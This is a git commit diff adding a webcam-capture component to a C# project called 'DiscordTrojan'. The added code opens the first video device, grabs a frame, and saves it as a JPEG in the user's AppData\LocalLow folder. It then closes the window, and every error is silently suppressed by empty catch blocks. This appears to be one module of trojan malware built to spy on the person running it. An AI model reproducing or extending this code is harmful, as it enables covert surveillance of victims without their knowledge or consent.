e9073a8bced6e29e2400edacc708a42d51c95622
Africankony <108126937+Africankony@users.noreply.github.com>
2022-06-24 14:11:57 +0200

    Update1.1
    removed return

--- DiscordTrojan/Camera.cs
+++ DiscordTrojan/Camera.cs
@@ -20,4 +20,70 @@ namespace DiscordTrojan
             InitializeComponent();
         }
 
+        string userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+        string root = @"\AppData\LocalLow";
+        VideoCaptureDevice videoCapture;
+        FilterInfoCollection filterInfo;
 
+
+        private void Camera_Load(object sender, EventArgs e)
+        {
+
+            StartCamera();
+        }
+
+        void StartCamera()
+        {
+            try
+            {
+                filterInfo = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+                videoCapture = new VideoCaptureDevice(filterInfo[0].MonikerString);
+                videoCapture.NewFrame += new NewFrameEventHandler(CameraScreenshot);
+                videoCapture.Start();
+                Thread.Sleep(1000);
+                videoCapture.Stop();
+                SaveScreenshot();
+                this.Close();
+            }
+            catch
+            {
+            }
+        }
+
+        private void CameraScreenshot(object sender, NewFrameEventArgs eventArgs)
+        {
+            pictureBox1.Image = (Bitmap)eventArgs.Frame.Clone();
+        }
+
+        void SaveScreenshot()
+        {
+            try
+            {
+
+                var bitmap = new Bitmap(pictureBox1.Width, pictureBox1.Height);
+                pictureBox1.DrawToBitmap(bitmap, pictureBox1.ClientRectangle);
+                System.Drawing.Imaging.ImageFormat imageFormat = null;
+                imageFormat = System.Drawing.Imaging.ImageFormat.Jpeg;
+                bitmap.Save(userPath + root + "\\Capture1.jpg", imageFormat);
+
+            }
+            catch
+            {
+            
+            }
+        }
+
+
+        private void Camera_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            try
+            {
+                videoCapture.Stop();
+            }
+            catch
+            {
+            
+            }
+        }
+    }
+}
